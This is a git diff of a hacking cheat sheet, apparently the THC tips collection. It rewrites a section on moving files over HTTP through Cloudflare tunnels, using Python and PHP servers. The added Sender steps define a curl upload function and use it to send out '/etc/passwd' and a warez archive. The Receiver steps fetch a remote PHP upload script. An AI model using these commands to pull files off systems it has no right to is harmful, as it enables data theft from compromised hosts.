@@ -1069,26 +1069,41 @@ gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
 ### 4.v. File transfer - using HTTPs
 
 #### Download from Server to Receiver:
+
+On the Sender/Server:
 ```sh
 ## Spawn a temporary HTTP server and share the current working directory.
-python -m http.server 8080 # --bind 127.0.0.1
-```
-
-```sh
-## Request a temporary tunnel on a public domain
+python -m http.server 8080 --bind 127.0.0.1 &
+# alternative: php -S 127.0.0.1:8080
 cloudflared tunnel -url localhost:8080
 ```
 Receiver: Access the URL from any browser to view/download the remote file system.
 
-#### Upload from Sender to Receiver:
+#### 1 - Upload using PHP:
+
+On the Receiver:
 ```
-## Spawn an upload server on the Receiver:
-pip install uploadserver
-python -m uploadserver
+curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
+mkdir upload
+(cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
+cloudflared tunnel --url localhost:8080 --no-autoupdate
 ```
 
-```sh
-## Make it available through a public domain
+On the Sender:
+```
+# Set a function:
+up() { curl -fsSL -F "file=@${1:?}" https://ABOVE-URL-HERE.trycloudflare.com; }
+# upload files like so:
+up warez.tar.gz
+up /etc/passwd
+```
+
+#### 2 - Upload using PYTHON:
+
+On the Receiver:
+```
+pip install uploadserver
+python -m uploadserver &
 cloudflared tunnel -url localhost:8000
 ```
 
